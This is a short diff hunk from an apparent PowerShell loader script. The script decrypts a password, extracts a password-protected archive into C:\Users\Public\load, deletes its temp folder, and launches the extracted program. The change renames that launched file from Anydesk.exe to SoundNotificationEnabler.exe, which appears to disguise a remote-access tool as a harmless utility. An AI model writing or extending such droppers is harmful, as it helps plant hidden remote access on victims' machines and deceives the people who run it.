@@ -168,7 +168,7 @@ $password = Get-DecryptedPassword
 $sevenZipCmdPath = "$sevenZipExtractPath\7za.exe"
 UnzipFileWith7Zip -filePath $downloadPath -outputPath "C:\Users\Public\load" -password $password
 Cleanup -folderPath $tempFolderPath
-Launch -extractedFilePath "C:\Users\Public\load\Anydesk.exe"
+Launch -extractedFilePath "C:\Users\Public\load\SoundNotificationEnabler.exe"
 
 # if ($binaryString -ne $null) {
 #     $hexString = Convert-BinaryToHex -binaryString $binaryString
